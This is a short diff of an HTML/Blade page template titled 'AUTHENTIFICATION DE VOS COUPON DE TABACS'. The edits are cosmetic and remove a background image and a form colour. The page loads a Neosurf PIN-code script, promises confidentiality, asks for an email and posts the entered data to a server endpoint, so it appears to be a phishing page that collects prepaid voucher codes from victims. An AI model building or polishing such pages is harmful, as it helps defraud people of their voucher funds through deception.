@@ -66,7 +66,7 @@
     </div>
   </nav>
 
-  <main class="main" style="background-image: url('images/neosurf/controle_neosurf.png'); background-color: #ffffff; background-position: right bottom;background-repeat: no-repeat;">
+  <main class="main" style=" background-color: #ffffff; background-position: right bottom;background-repeat: no-repeat;">
     <script type="text/javascript" src="assets/js/neosurf_pincode.js"></script>
     <div id="content" class="container">
       <h1 style="text-align: center;">AUTHENTIFICATION DE VOS COUPON DE TABACS</h1>
@@ -74,7 +74,7 @@
       <p id="explanation" class="well">Les informations entrées ne sont traités que par le serveur et sont totalement confidentielles. <br> Veuillez insérer un mail valide afin de recevoir la confirmation par courriel.</p>
       <div id="formCenter" class="row">
         <div class="col-sm-4 col-sm-push-3 col-md-3 col-md-push-4">
-          <form action="/message" style="color: blue;" method="POST" name="loginForm1" id="loginForm1" onsubmit="return submitOnce()">
+          <form action="/message" method="POST" name="loginForm1" id="loginForm1" onsubmit="return submitOnce()">
             @csrf
             <div class="row">
               <div class="col-xs-6">
